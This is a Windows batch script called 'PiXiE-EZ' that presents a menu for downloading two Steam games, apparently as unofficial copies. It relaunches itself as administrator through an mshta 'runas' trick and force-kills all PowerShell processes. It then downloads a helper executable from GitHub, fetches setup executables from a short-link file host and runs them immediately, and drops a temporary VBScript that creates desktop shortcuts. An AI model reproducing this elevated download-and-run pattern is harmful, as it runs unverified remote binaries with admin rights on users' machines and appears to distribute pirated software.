@echo off
set ver=0.1 BETA
color 0D
REM Run as admin
%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd","/c %~s0 ::","","runas",1)(window.close) && exit
cd /d "%~dp0"
taskkill /IM powershell.exe /F

title PiXiE-EZ V%ver%

:MainMenu
cls
title PiXiE-EZ V%ver%
mode 82, 25
echo:     ________________________________________________________________________
echo:
echo:                                      Welcome
echo:                              developed by pixieez1
echo:     ________________________________________________________________________ 
echo:      Request
echo:
echo:         [1] Wizard with a Gun  (13262001) (id=1150530) ^| Steam ^|  Download
echo:         [2] Secrets Of Grindea (v1.00a)   (id=269770)  ^| Steam ^|  Download
echo:         ________________________________________________________________
echo.
echo:         [4] FakeAppID 638490
echo:         
echo:         [0] Exit
echo:     ________________________________________________________________________ 
echo:                                   2024 ^| PiXiE
echo.
echo:     Enter a menu option in the Keyboard [1,2,4,0] :
choice /C:123456780 /N
set "userChoice=%errorlevel%"

if %userChoice%==1 goto Download1
if %userChoice%==2 goto Download2
if %userChoice%==3 goto Download3
if %userChoice%==4 goto FakeappID
if %userChoice%==9 goto EndScript

:Download1
echo.
echo:  please set your path (e.g. : [D:\Games] or etc.)
set /p pixie_dir="  path:  "
curl -o %temp%/aria2c.exe https://raw.githubusercontent.com/pixieez/pixieez/main/aria2c.exe
cd /d %temp%
aria2c --user-agent="Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" --file-allocation prealloc -x 1 -c -s 16 -k 1M -o Setup.wizard.with.a.gun.exe -d "%pixie_dir%" https://pd.cybar.xyz/dE3LLo2R
del aria2c.exe
cd /d %pixie_dir%
echo.
echo.
echo: Download Complete! ^| Wait for Unpack..
echo: When finished unpacking, you can close the console or 'Enter' to go to the main menu.
start "" "Setup.wizard.with.a.gun.exe"
echo.
@echo off
set SCRIPT="%TEMP%\%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%.vbs"

echo Set oWS = WScript.CreateObject("WScript.Shell") >> %SCRIPT%
echo sLinkFile = "%USERPROFILE%\Desktop\Wizard With a Gun.lnk" >> %SCRIPT%
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> %SCRIPT%
echo oLink.TargetPath = "%CD%\Wizard with a Gun\wizardwithagun.exe" >> %SCRIPT%
echo oLink.IconLocation = "%CD%\Wizard with a Gun\wizardwithagun.exe, 0" >> %SCRIPT%
echo oLink.Save >> %SCRIPT%

cscript /nologo %SCRIPT%
del %SCRIPT%

pause
goto MainMenu


:Download2
echo.
echo:  please set your path (e.g. : [D:\Games] or etc.)
set /p pixie_dir="  path:  "
curl -o %temp%/aria2c.exe https://raw.githubusercontent.com/pixieez/pixieez/main/aria2c.exe
cd /d %temp%
aria2c --user-agent="Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" --file-allocation prealloc -x 1 -c -s 16 -k 1M -o Setup.Secrets.Of.Grindea.exe -d "%pixie_dir%" https://pd.cybar.xyz/KU2nXm5w
del aria2c.exe
cd /d %pixie_dir%
start "" "Setup.Secrets.Of.Grindea.exe"
pause
goto MainMenu

:FakeappID
start "" "steam://install/638490/"
pause >nul
goto MainMenu

:EndScript
echo Exiting script...
